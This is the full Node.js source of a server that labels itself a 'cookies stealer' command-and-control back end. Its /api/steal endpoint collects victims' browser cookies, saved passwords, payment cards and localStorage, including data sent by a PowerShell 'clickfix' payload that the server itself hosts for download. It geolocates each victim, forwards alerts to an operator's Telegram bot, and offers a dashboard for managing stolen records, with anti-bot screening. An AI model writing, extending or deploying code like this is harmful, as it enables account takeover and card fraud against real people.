// ============================================================
// SERVER.JS — Cipher Anon Cookies Stealer Pro v2.0
// Railway Ready — Full Environment Variable Support
// Fixed: Dedup uses IP + userAgent + screen + nonce + data check
// Fixed: Handles PowerShell payload with PC name
// Clean URLs: NO .php in address bar — serves directly
// LocalStorage: Supports new localStorage field from payload
// Rename PC: API endpoint to rename PC across all victims
// ============================================================

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const session = require('express-session');

// Import Anti-Bot
const { antiBot, handleVerify } = require('./anti-bot.js');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// CONFIGURATION — Railway Friendly (Env Vars First)
// ============================================================

const CONFIG_FILE = path.join(__dirname, 'config.json');

function generateValidKey() {
    return crypto.randomBytes(32).toString('hex');
}

function loadConfig() {
    // Environment variables take priority
    const envConfig = {
        DASHBOARD_USERNAME: process.env.DASHBOARD_USERNAME || 'admin',
        DASHBOARD_PASSWORD: process.env.DASHBOARD_PASSWORD || 'SecurePass123',
        ENCRYPTION_KEY: process.env.ENCRYPTION_KEY || generateValidKey(),
        TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN',
        TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID',
        SEND_NOTIFICATIONS: process.env.SEND_NOTIFICATIONS !== 'false',
    };

    // Try to read config.json for persistence
    let fileConfig = {};
    if (fs.existsSync(CONFIG_FILE)) {
        try {
            fileConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
            console.log('[+] Loaded config from file');
        } catch (e) {
            console.log('[!] Config file corrupt, using env vars');
        }
    }

    // Merge: env vars override file
    const merged = { ...fileConfig, ...envConfig };

    // Validate encryption key
    const key = merged.ENCRYPTION_KEY;
    if (typeof key !== 'string' || key.length !== 64 || !/^[a-f0-9]{64}$/i.test(key)) {
        console.log('[!] Invalid encryption key — generating new one');
        merged.ENCRYPTION_KEY = generateValidKey();
    }

    // Save merged config back to file
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(merged, null, 2));
    } catch (e) {
        console.log('[!] Config file not writable — using env vars only');
    }

    return merged;
}

const CONFIG = loadConfig();

// Log config (hide sensitive data)
console.log(`[+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
console.log(`[+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
console.log(`[+] Encryption Key: ${CONFIG.ENCRYPTION_KEY.slice(0,8)}...`);
console.log(`[+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED' : 'DISABLED'}`);

// ============================================================
// DATA FILES
// ============================================================

const DATA_FILE = path.join(__dirname, 'stolen.enc');
const TRASH_FILE = path.join(__dirname, 'trash.enc');
const LOG_FILE = path.join(__dirname, 'steal.log');

// ============================================================
// SESSION SETUP
// ============================================================

const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const SESSION_MAX_AGE = 30 * 60 * 1000; // 30 minutes

app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: false,
        maxAge: SESSION_MAX_AGE,
        httpOnly: true,
        sameSite: 'lax'
    }
}));

// Session activity check
app.use((req, res, next) => {
    if (req.session && req.session.authenticated) {
        const now = Date.now();
        const lastActivity = req.session.lastActivity || now;
        if (now - lastActivity > SESSION_MAX_AGE) {
            req.session.destroy(() => {
                if (req.path.startsWith('/api')) {
                    return res.status(401).json({ status: 'error', message: 'Session expired' });
                }
                res.redirect('/login');
            });
            return;
        }
        req.session.lastActivity = now;
    }
    next();
});

// ============================================================
// ENCRYPTION ENGINE
// ============================================================

function encryptData(data) {
    const key = Buffer.from(CONFIG.ENCRYPTION_KEY, 'hex');
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    const encrypted = Buffer.concat([cipher.update(JSON.stringify(data)), cipher.final()]);
    const tag = cipher.getAuthTag();
    return Buffer.concat([iv, tag, encrypted]).toString('base64');
}

function decryptData(encryptedBase64) {
    try {
        const key = Buffer.from(CONFIG.ENCRYPTION_KEY, 'hex');
        const buffer = Buffer.from(encryptedBase64, 'base64');
        const iv = buffer.subarray(0, 16);
        const tag = buffer.subarray(16, 32);
        const encrypted = buffer.subarray(32);
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(tag);
        const decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
        return JSON.parse(decrypted.toString());
    } catch (e) {
        console.log('[!] Decryption failed:', e.message);
        return null;
    }
}

function saveData(file, data) {
    fs.writeFileSync(file, encryptData(data));
}

function loadData(file) {
    if (!fs.existsSync(file)) return [];
    try {
        const decrypted = decryptData(fs.readFileSync(file, 'utf8'));
        return decrypted || [];
    } catch (e) {
        console.log(`[!] Failed to load ${file}:`, e.message);
        return [];
    }
}

let stolenData = loadData(DATA_FILE);
let trashData = loadData(TRASH_FILE);

// ============================================================
// NUCLEAR DEDUP — IP + userAgent + screen + nonce + data check
// ============================================================

const dedupCache = new Map();
const nonceCache = new Map();
const DEDUP_WINDOW = 5000; // 5 seconds

function cleanDedup() {
    const now = Date.now();
    for (const [key, ts] of dedupCache) {
        if (now - ts > DEDUP_WINDOW) dedupCache.delete(key);
    }
    for (const [nonce, ts] of nonceCache) {
        if (now - ts > DEDUP_WINDOW) nonceCache.delete(nonce);
    }
}

function getRealIp(req) {
    // Try X-Forwarded-For first (Railway uses this)
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0];
    }
    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp;
    return req.connection.remoteAddress;
}

function getDedupKey(ip, userAgent, screen, nonce) {
    let cleanIp = ip;
    if (ip === '::1' || ip === '::ffff:127.0.0.1' || ip === '127.0.0.1') {
        cleanIp = '127.0.0.1';
    }
    const ua = (userAgent || '').slice(0, 50);
    const scr = screen || 'unknown';
    const n = nonce || 'no-nonce';
    return crypto.createHash('md5').update(`${cleanIp}|${ua}|${scr}|${n}`).digest('hex');
}

function isIpInData(ip, source) {
    const now = Date.now();
    const fiveSecondsAgo = now - 5000;
    for (const entry of stolenData) {
        if (entry.ip === ip && entry.source === source) {
            const entryTime = new Date(entry.receivedAt).getTime();
            if (entryTime > fiveSecondsAgo) {
                console.log(`[!] IP ${ip} already in stored data within 5s (source: ${source})`);
                return true;
            }
        }
    }
    return false;
}

function isDuplicate(req, userAgent, screen, nonce, source) {
    cleanDedup();

    if (nonce && nonceCache.has(nonce)) {
        console.log(`[!] Nonce duplicate: ${nonce}`);
        return true;
    }

    const ip = getRealIp(req);

    if (isIpInData(ip, source)) {
        return true;
    }

    const key = getDedupKey(ip, userAgent, screen, nonce);
    if (dedupCache.has(key)) {
        const ts = dedupCache.get(key);
        if (Date.now() - ts < DEDUP_WINDOW) {
            console.log(`[!] Dedup duplicate: ${key} (IP: ${ip})`);
            return true;
        }
    }

    if (nonce) {
        nonceCache.set(nonce, Date.now());
    }
    dedupCache.set(key, Date.now());
    return false;
}

// ============================================================
// LOGGING
// ============================================================

function log(msg) {
    const entry = `[${new Date().toISOString()}] ${msg}`;
    console.log(entry);
    try { fs.appendFileSync(LOG_FILE, entry + '\n'); } catch (e) {}
}

// ============================================================
// AUTH MIDDLEWARE
// ============================================================

function requireAuth(req, res, next) {
    if (req.session && req.session.authenticated === true) {
        return next();
    }
    if (req.path.startsWith('/api')) {
        return res.status(401).json({ status: 'error', message: 'Unauthorized - Please login' });
    }
    res.redirect('/login');
}

// ============================================================
// SERVER SETUP
// ============================================================

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// ---- TRUST PROXY (Railway) ----
app.set('trust proxy', true);

// ---- ANTI-BOT ----
app.use(antiBot({
    STRENGTH: 'high',
    RATE_LIMIT_MAX: 10,
    ALLOWED_IPS: []
}));

app.post('/__verify', express.json(), handleVerify);

// ---- SECURITY HEADERS ----
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');

    if (req.path.endsWith('.html')) {
        return res.status(404).send('Not Found');
    }
    next();
});

// ============================================================
// HEALTH CHECK
// ============================================================

app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.get('/ping', (req, res) => {
    res.send('pong');
});

// ============================================================
// GEOLOCATION
// ============================================================

async function getCountryInfo(ip) {
    try {
        const response = await axios.get('http://ip-api.com/json/' + ip, { timeout: 5000 });
        const data = response.data;
        if (data.status === 'success') {
            return {
                country: data.country,
                countryCode: data.countryCode,
                region: data.regionName,
                city: data.city,
                isp: data.isp,
                lat: data.lat,
                lon: data.lon
            };
        }
        return null;
    } catch (error) {
        log(`[!] Geolocation failed for ${ip}: ${error.message}`);
        return null;
    }
}

// ============================================================
// TELEGRAM
// ============================================================

async function sendTelegram(host, count, ip, countryInfo, credCount, cardCount, storageCount) {
    if (!CONFIG.SEND_NOTIFICATIONS) return;
    const t = CONFIG.TELEGRAM_BOT_TOKEN;
    const c = CONFIG.TELEGRAM_CHAT_ID;
    if (!t || t === 'YOUR_BOT_TOKEN' || t === '') return;

    const flag = countryInfo?.countryCode ? getFlagEmoji(countryInfo.countryCode) : '🌍';
    const countryName = countryInfo?.country || 'Unknown';
    const city = countryInfo?.city || 'N/A';
    const isp = countryInfo?.isp || 'N/A';
    const time = new Date().toLocaleString();

    let extra = '';
    if (credCount > 0) extra += `\n🔑 *Credentials:* ${credCount}`;
    if (cardCount > 0) extra += `\n💳 *Cards:* ${cardCount}`;
    if (storageCount > 0) extra += `\n💾 *LocalStorage:* ${storageCount}`;

    const message = `🍪 *Cipher Anon — New Data Stolen!*

📍 *Domain:* ${host}
🍪 *Cookies:* ${count}
${extra}
👤 *IP:* ${ip}
${flag} *Country:* ${countryName}
🏙️ *City:* ${city}
📡 *ISP:* ${isp}
🕐 *Time:* ${time}

📊 *Dashboard:* ${process.env.DASHBOARD_URL || 'https://' + (req?.headers?.host || 'localhost:' + PORT)}/dashboard`;

    try {
        await axios.post(`https://api.telegram.org/bot${t}/sendMessage`, {
            chat_id: c,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        }, { timeout: 10000 });
        log('[+] Telegram notification sent');
    } catch (e) {
        log(`[!] Telegram failed: ${e.message}`);
    }
}

function getFlagEmoji(countryCode) {
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
}

// ============================================================
// GENERATE UNIQUE ID
// ============================================================

function generateUniqueId(entry) {
    const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
    const ip = entry.ip || 'unknown';
    const time = entry.receivedAt || new Date().toISOString();
    return crypto.createHash('md5').update(`${time}|${ip}|${domain}`).digest('hex');
}

// ============================================================
// API ROUTES
// ============================================================

// ---- LOGIN API ----
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ status: 'error', message: 'Username and password required' });
    }

    if (username === CONFIG.DASHBOARD_USERNAME && password === CONFIG.DASHBOARD_PASSWORD) {
        req.session.authenticated = true;
        req.session.username = username;
        req.session.lastActivity = Date.now();
        req.session.save();
        log(`[+] User logged in: ${username}`);
        return res.json({ status: 'ok', message: 'Login successful', redirect: '/dashboard' });
    }

    log(`[!] Failed login attempt: ${username}`);
    res.status(401).json({ status: 'error', message: 'Invalid username or password' });
});

// ---- LOGOUT (clean URL) ----
app.get('/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) log(`[!] Logout error: ${err.message}`);
        res.clearCookie('connect.sid');
        log('[+] User logged out, session destroyed');
        res.redirect('/login');
    });
});

// ---- LOGOUT (API fallback) ----
app.get('/api/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) log(`[!] Logout error: ${err.message}`);
        res.clearCookie('connect.sid');
        log('[+] User logged out, session destroyed');
        res.redirect('/login');
    });
});

// ---- STEAL COOKIES (Main Endpoint — Handles Both Browser & Payload) ----
app.post('/api/steal', async (req, res) => {
    try {
        const data = req.body;
        const realIp = getRealIp(req);

        const countryInfo = await getCountryInfo(realIp);

        data.ip = realIp;
        data.country = countryInfo?.country || 'Unknown';
        data.countryCode = countryInfo?.countryCode || 'XX';
        data.city = countryInfo?.city || 'N/A';
        data.region = countryInfo?.region || 'N/A';
        data.isp = countryInfo?.isp || 'N/A';
        data.receivedAt = new Date().toISOString();
        data.credentials = data.credentials || [];
        data.cards = data.cards || [];
        data.localStorage = data.localStorage || {};

        const userAgent = data.fingerprint?.userAgent || '';
        const screen = data.fingerprint?.screen || '';
        const nonce = data.nonce || '';
        const source = data.source || 'browser';

        // ---- If this is from the PowerShell payload, extract PC name ----
        if (source === 'clickfix_payload' && data.system && data.system.hostname) {
            if (data.fingerprint) {
                data.fingerprint.hostname = data.system.hostname;
                data.fingerprint.userAgent = 'PowerShell Payload (Windows)';
            }
            data.pcName = data.system.hostname;
            data.victimUsername = data.system.username || 'Unknown';
            data.victimOS = data.system.os || 'Unknown';
            
            log(`[PAYLOAD] PC: ${data.system.hostname} | User: ${data.system.username} | ${data.cookies?.length || 0} cookies, ${data.passwords?.length || 0} passwords, ${data.cards?.length || 0} cards, ${Object.keys(data.localStorage || {}).length} LocalStorage | ${realIp}`);
        }

        // ---- NUCLEAR DEDUP ----
        if (isDuplicate(req, userAgent, screen, nonce, source)) {
            log(`[!] Duplicate from ${realIp} — ignored`);
            return res.json({ status: 'ok', duplicate: true });
        }

        data._uniqueId = generateUniqueId(data);
        stolenData.push(data);
        saveData(DATA_FILE, stolenData);

        const hostname = data.fingerprint?.hostname || data.domain || 'unknown';
        const count = data.cookies ? (typeof data.cookies === 'object' ? Object.keys(data.cookies).length : data.cookies.length || 0) : 0;
        const credCount = data.credentials.length;
        const cardCount = data.cards.length;
        const storageCount = Object.keys(data.localStorage || {}).length;

        log(`[+] ${hostname} — ${count} cookies, ${credCount} creds, ${cardCount} cards, ${storageCount} storage | ${realIp}`);
        await sendTelegram(hostname, count, realIp, countryInfo, credCount, cardCount, storageCount);

        res.json({ status: 'ok', country: countryInfo });
    } catch (e) {
        log(`[!] Error in /api/steal: ${e.message}`);
        res.status(500).json({ status: 'error', message: e.message });
    }
});

// ---- GET ALL DATA ----
app.get('/api/data', requireAuth, (req, res) => {
    const clean = stolenData.map(({ _dedupKey, ...rest }) => rest);
    res.json(clean);
});

// ---- GET TRASH DATA ----
app.get('/api/trash', requireAuth, (req, res) => {
    const clean = trashData.map(({ _dedupKey, ...rest }) => rest);
    res.json(clean);
});

// ---- MOVE TO TRASH ----
app.delete('/api/delete/:uniqueId', requireAuth, (req, res) => {
    const uid = req.params.uniqueId;
    if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
        return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
    }
    const index = stolenData.findIndex(entry => entry._uniqueId === uid);
    if (index === -1) {
        return res.status(404).json({ status: 'error', message: 'Victim not found' });
    }
    try {
        const removed = stolenData.splice(index, 1)[0];
        removed.deletedAt = new Date().toISOString();
        trashData.push(removed);
        saveData(DATA_FILE, stolenData);
        saveData(TRASH_FILE, trashData);
        log(`[+] Moved to trash: ${removed?.fingerprint?.hostname || removed?.domain || 'unknown'}`);
        res.json({ status: 'ok', moved: removed });
    } catch (e) {
        log(`[!] Error: ${e.message}`);
        res.status(500).json({ status: 'error', message: e.message });
    }
});

// ---- RESTORE FROM TRASH ----
app.post('/api/restore/:uniqueId', requireAuth, (req, res) => {
    const uid = req.params.uniqueId;
    if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
        return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
    }
    const index = trashData.findIndex(entry => entry._uniqueId === uid);
    if (index === -1) {
        return res.status(404).json({ status: 'error', message: 'Victim not found in trash' });
    }
    try {
        const restored = trashData.splice(index, 1)[0];
        delete restored.deletedAt;
        stolenData.push(restored);
        saveData(DATA_FILE, stolenData);
        saveData(TRASH_FILE, trashData);
        log(`[+] Restored from trash: ${restored?.fingerprint?.hostname || restored?.domain || 'unknown'}`);
        res.json({ status: 'ok', restored: restored });
    } catch (e) {
        log(`[!] Error: ${e.message}`);
        res.status(500).json({ status: 'error', message: e.message });
    }
});

// ---- PERMANENTLY DELETE ----
app.delete('/api/trash/permanent/:uniqueId', requireAuth, (req, res) => {
    const uid = req.params.uniqueId;
    if (!uid || !/^[a-f0-9]{32}$/i.test(uid)) {
        return res.status(400).json({ status: 'error', message: 'Invalid unique ID format' });
    }
    const index = trashData.findIndex(entry => entry._uniqueId === uid);
    if (index === -1) {
        return res.status(404).json({ status: 'error', message: 'Victim not found in trash' });
    }
    try {
        const removed = trashData.splice(index, 1)[0];
        saveData(TRASH_FILE, trashData);
        log(`[+] Permanently deleted: ${removed?.fingerprint?.hostname || removed?.domain || 'unknown'}`);
        res.json({ status: 'ok', permanentlyDeleted: removed });
    } catch (e) {
        log(`[!] Error: ${e.message}`);
        res.status(500).json({ status: 'error', message: e.message });
    }
});

// ---- EMPTY TRASH ----
app.delete('/api/trash/empty', requireAuth, (req, res) => {
    try {
        const count = trashData.length;
        trashData = [];
        saveData(TRASH_FILE, trashData);
        log(`[+] Emptied trash: ${count} victims`);
        res.json({ status: 'ok', count: count });
    } catch (e) {
        log(`[!] Error: ${e.message}`);
        res.status(500).json({ status: 'error', message: e.message });
    }
});

// ---- CLEAR ALL DATA ----
app.delete('/api/clear', requireAuth, (req, res) => {
    try {
        stolenData = [];
        saveData(DATA_FILE, stolenData);
        log('[+] All data cleared');
        res.json({ status: 'ok' });
    } catch (e) {
        res.status(500).json({ status: 'error', message: e.message });
    }
});

// ---- CHANGE PASSWORD ----
app.post('/api/change-password', requireAuth, (req, res) => {
    const { oldPassword, newPassword } = req.body;

    if (!oldPassword || !newPassword) {
        return res.status(400).json({ status: 'error', message: 'Old and new password required' });
    }

    if (newPassword.length < 4) {
        return res.status(400).json({ status: 'error', message: 'New password must be at least 4 characters' });
    }

    if (oldPassword !== CONFIG.DASHBOARD_PASSWORD) {
        return res.status(401).json({ status: 'error', message: 'Current password is incorrect' });
    }

    CONFIG.DASHBOARD_PASSWORD = newPassword;
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
    } catch (e) {
        log(`[!] Failed to save config: ${e.message}`);
    }
    log('[+] Password changed successfully');

    req.session.destroy((err) => {
        if (err) log(`[!] Session destroy error: ${err.message}`);
        res.clearCookie('connect.sid');
        res.json({
            status: 'ok',
            message: 'Password updated successfully',
            redirect: '/password-success'
        });
    });
});

// ---- GET TELEGRAM CONFIG ----
app.get('/api/config/telegram', requireAuth, (req, res) => {
    res.json({
        botToken: CONFIG.TELEGRAM_BOT_TOKEN || '',
        chatId: CONFIG.TELEGRAM_CHAT_ID || '',
        notifications: CONFIG.SEND_NOTIFICATIONS !== undefined ? CONFIG.SEND_NOTIFICATIONS : true
    });
});

// ---- UPDATE TELEGRAM CONFIG ----
app.post('/api/config/telegram', requireAuth, (req, res) => {
    const { botToken, chatId, notifications } = req.body;

    if (!botToken || !chatId) {
        return res.status(400).json({
            status: 'error',
            message: 'Bot token and chat ID are required'
        });
    }

    CONFIG.TELEGRAM_BOT_TOKEN = botToken;
    CONFIG.TELEGRAM_CHAT_ID = chatId;
    CONFIG.SEND_NOTIFICATIONS = notifications !== undefined ? notifications : true;

    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
    } catch (e) {
        log(`[!] Failed to save config: ${e.message}`);
    }

    log('[+] Telegram config updated');
    res.json({ status: 'ok', message: 'Telegram settings updated successfully' });
});

// ============================================================
// RENAME PC — API ENDPOINT
// ============================================================

app.post('/api/rename-pc', requireAuth, (req, res) => {
    const { oldName, newName } = req.body;

    if (!oldName || !newName) {
        return res.status(400).json({
            status: 'error',
            message: 'Old and new PC names are required'
        });
    }

    if (oldName === newName) {
        return res.json({
            status: 'ok',
            message: 'No changes made',
            updated: 0
        });
    }

    let updatedMain = 0;
    let updatedTrash = 0;

    // Update in stolenData
    stolenData.forEach(entry => {
        const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
        if (pc === oldName) {
            entry.pcName = newName;
            updatedMain++;
        }
    });

    // Update in trashData
    trashData.forEach(entry => {
        const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
        if (pc === oldName) {
            entry.pcName = newName;
            updatedTrash++;
        }
    });

    if (updatedMain === 0 && updatedTrash === 0) {
        return res.status(404).json({
            status: 'error',
            message: 'No victims found with that PC name'
        });
    }

    // Save both files
    saveData(DATA_FILE, stolenData);
    saveData(TRASH_FILE, trashData);

    log(`[+] Renamed PC: "${oldName}" → "${newName}" (${updatedMain} victims, ${updatedTrash} in trash)`);

    res.json({
        status: 'ok',
        message: `Renamed ${updatedMain} victims from "${oldName}" to "${newName}"`,
        updated: updatedMain,
        updatedTrash: updatedTrash
    });
});

// ============================================================
// FRONTEND ROUTES — CLEAN URLS (NO .php IN ADDRESS BAR)
// ============================================================

// ---- Public Routes (No Auth Required) ----
app.get('/', (req, res) => {
    if (req.session && req.session.authenticated) {
        return res.redirect('/dashboard');
    }
    res.redirect('/home');
});

app.get('/home', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'home.php'));
});

app.get('/login', (req, res) => {
    if (req.session && req.session.authenticated) {
        return res.redirect('/dashboard');
    }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'login.php'));
});

// ---- Protected Routes (Auth Required) ----
app.get('/dashboard', requireAuth, (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'dashboard.php'));
});

app.get('/password-success', requireAuth, (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
});

// ---- Serve DLLs from public folder ----
app.get('/System.Data.SQLite.dll', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'System.Data.SQLite.dll'));
});

app.get('/LevelDB.netAll.dll', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'LevelDB.netAll.dll'));
});

app.get('/leveldb.dll', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'leveldb.dll'));
});

// ---- Serve payload.ps1 ----
app.get('/payload.ps1', (req, res) => {
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'payload.ps1'));
});

// ---- Fallback .php routes (redirect to clean URLs for backward compatibility) ----
app.get('/home.php', (req, res) => {
    res.redirect('/home');
});

app.get('/login.php', (req, res) => {
    if (req.session && req.session.authenticated) {
        return res.redirect('/dashboard');
    }
    res.redirect('/login');
});

app.get('/dashboard.php', requireAuth, (req, res) => {
    res.redirect('/dashboard');
});

app.get('/password-success.php', requireAuth, (req, res) => {
    res.redirect('/password-success');
});

// ============================================================
// SERVE .PHP FILES — BLOCK DIRECT ACCESS
// ============================================================

app.get('*.php', (req, res, next) => {
    const filePath = path.join(__dirname, 'public', req.path);
    
    // Public .php files (no auth required)
    const publicPhp = ['/login.php', '/home.php'];
    
    if (publicPhp.includes(req.path)) {
        if (fs.existsSync(filePath)) {
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            return res.sendFile(filePath);
        }
        return next();
    }
    
    // ALL other .php files require authentication
    if (!req.session || !req.session.authenticated) {
        return res.redirect('/login');
    }
    
    if (fs.existsSync(filePath)) {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.sendFile(filePath);
    } else {
        const basePath = filePath.replace(/\.php$/, '');
        if (fs.existsSync(basePath)) {
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            res.sendFile(basePath);
        } else {
            next();
        }
    }
});

// ============================================================
// STATIC FILES FALLBACK
// ============================================================

app.use((req, res, next) => {
    const filePath = path.join(__dirname, 'public', req.path);
    if (fs.existsSync(filePath) && !req.path.startsWith('/api')) {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        return res.sendFile(filePath);
    }
    next();
});

// ============================================================
// 404 HANDLER
// ============================================================

app.use((req, res) => {
    if (req.path.startsWith('/api')) {
        res.status(404).json({ status: 'error', message: 'API endpoint not found' });
    } else {
        res.status(404).send('Not Found');
    }
});

// ============================================================
// ERROR HANDLER
// ============================================================

app.use((err, req, res, next) => {
    console.error('[!] Error:', err.message);
    console.error(err.stack);
    if (req.path.startsWith('/api')) {
        res.status(500).json({ status: 'error', message: err.message || 'Internal Server Error' });
    } else {
        res.status(500).send('Internal Server Error');
    }
});

// ============================================================
// START SERVER
// ============================================================

app.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '='.repeat(55));
    console.log('  🍪 CIPHER ANON COOKIES STEALER PRO v2.0');
    console.log('='.repeat(55));
    console.log(`  [+] Server: http://localhost:${PORT}`);
    console.log(`  [+] Login: http://localhost:${PORT}/login`);
    console.log(`  [+] Home: http://localhost:${PORT}/home`);
    console.log(`  [+] Dashboard: http://localhost:${PORT}/dashboard`);
    console.log(`  [+] Health: http://localhost:${PORT}/health`);
    console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
    console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
    console.log(`  [+] Session Timeout: 30 minutes`);
    console.log(`  [+] Dedup: IP + UA + screen + nonce + data check, 5s window`);
    console.log(`  [+] Anti-Bot: ENABLED ✅`);
    console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
    console.log(`  [+] Clean URLs: ENABLED ✅ (no .php in address bar)`);
    console.log(`  [+] LocalStorage: ENABLED ✅ (from payload)`);
    console.log(`  [+] Rename PC: ENABLED ✅ (/api/rename-pc)`);
    console.log('='.repeat(55) + '\n');
});

// ============================================================
// GRACEFUL SHUTDOWN — Save data on exit
// ============================================================

process.on('SIGINT', () => {
    console.log('\n[!] Received SIGINT. Saving data...');
    saveData(DATA_FILE, stolenData);
    saveData(TRASH_FILE, trashData);
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n[!] Received SIGTERM. Saving data...');
    saveData(DATA_FILE, stolenData);
    saveData(TRASH_FILE, trashData);
    process.exit(0);
});

module.exports = app;
